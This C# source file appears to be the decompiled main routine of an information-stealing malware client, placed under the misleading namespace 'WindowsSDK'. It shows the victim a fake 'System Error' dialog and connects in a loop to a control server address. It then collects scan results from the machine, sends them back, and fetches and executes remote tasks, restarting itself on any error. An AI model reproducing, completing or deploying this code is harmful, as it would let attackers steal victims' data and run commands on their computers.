using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WindowsSDK.Extensions;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Data
{
    public class EndpointManager
    {
        private string IP { get; }

        private string ID { get; }

        private string Message { get; set; }

        public EndpointManager()
        {
            IP = "127.0.0.1:123";
            ID = "xyu";
            Message = "xyu TaM";
        }

        public void Start()
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(Message))
                {
                    Task.Factory.StartNew(delegate
                    {
                        MessageBox.Show(Message, "System Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    });
                }
                EndpointConnection endpointConnection = new EndpointConnection();
                bool flag = false;
                while (!flag)
                {
                    string[] array = IP.Split('|');
                    foreach (string address in array)
                    {
                        if (endpointConnection.RequestConnection(address))
                        {
                            flag = true;
                            break;
                        }
                    }
                    Thread.Sleep(5000);
                }
                ScanningArgs args = new ScanningArgs();
                while (!endpointConnection.TryGetArgs(out args))
                {
                    Thread.Sleep(1000);
                }
                ScanResult scanResult = default(ScanResult);
                scanResult.ReleaseID = ID;
                ScanResult result = scanResult;
                while (!ResultFactory.Create(args, ref result))
                {
                    Thread.Sleep(5000);
                }
                result.ReplaceEmptyValues();
                while (!endpointConnection.TryVerify(result))
                {
                    Thread.Sleep(1000);
                }
                ScanResult scanResult2 = result;
                scanResult2.ScanDetails = new ScanDetails();
                IList<UpdateTask> remoteTasks = new List<UpdateTask>();
                while (!endpointConnection.TryGetTasks(result, out remoteTasks))
                {
                    Thread.Sleep(1000);
                }
                foreach (UpdateTask item in Finilizer.ProcessTasks(result, remoteTasks))
                {
                    while (!endpointConnection.TryCompleteTask(result, item.TaskID))
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
            catch (Exception)
            {
                Start();
            }
        }
    }
}
